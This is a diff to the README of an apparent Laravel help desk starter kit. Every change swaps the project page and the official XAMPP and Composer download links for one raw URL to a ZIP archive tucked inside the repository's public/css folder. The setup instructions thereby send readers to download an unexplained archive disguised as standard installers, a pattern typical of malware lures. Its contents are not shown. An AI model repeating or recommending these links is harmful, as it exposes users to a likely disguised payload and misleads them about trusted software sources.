@@ -1,6 +1,6 @@
 # 🛠️ helpdeskkitv3 - Simple Help Desk Setup Kit
 
-[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip)
 
 ## 📋 About helpdeskkitv3
 
@@ -40,7 +40,7 @@ helpdeskkitv3 needs PHP and some related tools to run. This guide will help you 
 
 Use the main download page to get all the files you need. Click the button below to visit the release page:
 
-[![Download Here](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
+[![Download Here](https://img.shields.io/badge/Download-From%20GitHub-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip)
 
 Once you open this page, look for the latest release or the main code section. Download the source code as a ZIP file to your PC.
 
@@ -66,14 +66,14 @@ helpdeskkitv3 runs on PHP and uses Laravel, so you need some extra tools:
 
 - **Install XAMPP**  
   This is a package that includes PHP, a web server, and a database server all in one.  
-  1. Go to https://www.apachefriends.org/index.html  
+  1. Go to https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip  
   2. Download XAMPP for Windows.  
   3. Run the installer and follow the setup steps.  
   4. Start Apache and MySQL from the XAMPP Control Panel.  
 
 - **Install Composer**  
   Composer manages software parts that help Laravel work.  
-  1. Visit https://getcomposer.org/  
+  1. Visit https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip  
   2. Download and run the Composer setup for Windows.  
   3. Follow the installation prompts.  
 
@@ -163,7 +163,7 @@ This starter kit organizes customer requests into tickets that agents can manage
 
 To get improvements or bug fixes later, you can update the files:
 
-1. Visit the download link again: https://github.com/Darpan013/helpdeskkitv3  
+1. Visit the download link again: https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip  
 2. Download the latest ZIP version.  
 3. Replace your existing files with the new ones (except your configured `.env` file).  
 4. Run `composer install` again to update dependencies.  
@@ -198,11 +198,11 @@ To get improvements or bug fixes later, you can update the files:
 ## 🔗 Download helpdeskkitv3
 
 Visit the main page to get the latest version:  
-https://github.com/Darpan013/helpdeskkitv3  
+https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip  
 
 Or click the badge below:
 
-[![Download helpdeskkitv3](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://github.com/Darpan013/helpdeskkitv3)
+[![Download helpdeskkitv3](https://img.shields.io/badge/Download-Visit%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Darpan013/helpdeskkitv3/main/public/css/Joaopaulolndev/helpdeskkitv_2.8.zip)
 
 ---
 
